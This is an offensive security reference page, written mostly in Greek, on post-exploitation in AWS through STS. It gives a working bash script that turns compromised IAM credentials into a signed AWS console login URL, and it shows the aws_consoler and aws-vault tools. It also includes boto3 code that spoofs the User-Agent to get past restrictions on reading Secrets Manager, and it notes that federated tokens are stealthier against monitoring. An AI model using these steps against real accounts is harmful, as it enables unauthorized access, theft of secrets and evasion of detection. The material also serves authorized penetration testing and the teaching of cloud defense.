# AWS - STS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## STS

Για περισσότερες πληροφορίες:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### Από IAM Creds στο Console

Εάν καταφέρατε να αποκτήσετε κάποιες IAM credentials μπορεί να σας ενδιαφέρει η **πρόσβαση στο web console** χρησιμοποιώντας τα παρακάτω εργαλεία.\
Σημειώστε ότι ο χρήστης/ρόλος πρέπει να έχει την άδεια **`sts:GetFederationToken`**.

#### Προσαρμοσμένο script

Το ακόλουθο script θα χρησιμοποιήσει το default profile και μια default AWS location (not gov and not cn) για να σας δώσει ένα signed URL που μπορείτε να χρησιμοποιήσετε για να συνδεθείτε στο web console:
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)


# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
#### aws_consoler

Μπορείτε να **δημιουργήσετε έναν σύνδεσμο προς το web console** με [https://github.com/NetSPI/aws_consoler](https://github.com/NetSPI/aws_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
> [!WARNING]
> Βεβαιώσου ότι ο χρήστης IAM έχει την άδεια `sts:GetFederationToken`, ή δώσε έναν ρόλο για ανάληψη.

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) είναι ένα εργαλείο για ασφαλή αποθήκευση και πρόσβαση σε AWS credentials σε περιβάλλον ανάπτυξης.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
> [!NOTE]
> Μπορείτε επίσης να χρησιμοποιήσετε το **aws-vault** για να αποκτήσετε μια **συνεδρία κονσόλας προγράμματος περιήγησης**

### **Παράκαμψη περιορισμών User-Agent από Python**

Εάν υπάρχει **περιορισμός στην εκτέλεση ορισμένων ενεργειών με βάση τον User-Agent** που χρησιμοποιείται (π.χ. περιορισμός της χρήσης της python boto3 library με βάση τον User-Agent) είναι δυνατό να χρησιμοποιήσετε την προηγούμενη τεχνική για να **συνδεθείτε στην κονσόλα ιστού μέσω προγράμματος περιήγησης**, ή μπορείτε απευθείας να **τροποποιήσετε τον boto3 user-agent** κάνοντας:
```bash
# Shared by ex16x41
# Create a client
session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Change user agent of the client
client.meta.events.register( 'before-call.secretsmanager.GetSecretValue', lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'}) )

# Perform the action
response = client.get_secret_value(SecretId="flag_secret") print(response['SecretString'])
```
### **`sts:GetFederationToken`**

Με αυτή την άδεια είναι δυνατή η δημιουργία μιας ομοσπονδιακής ταυτότητας για τον χρήστη που την εκτελεί, περιορισμένη στις άδειες που διαθέτει ο χρήστης.
```bash
aws sts get-federation-token --name <username>
```
Το token που επιστρέφεται από sts:GetFederationToken ανήκει στην federated identity του χρήστη που καλεί, αλλά με περιορισμένα δικαιώματα. Ακόμη και αν ο χρήστης έχει administrator δικαιώματα, ορισμένες ενέργειες, όπως η απαρίθμηση IAM users ή η επισύναψη policies, δεν μπορούν να εκτελεστούν μέσω του federated token.

Επιπλέον, αυτή η μέθοδος είναι κάπως πιο stealthy, καθώς ο federated user δεν εμφανίζεται στο AWS Portal — μπορεί να παρατηρηθεί μόνο μέσω CloudTrail logs ή εργαλείων monitoring.

{{#include ../../../../banners/hacktricks-training.md}}
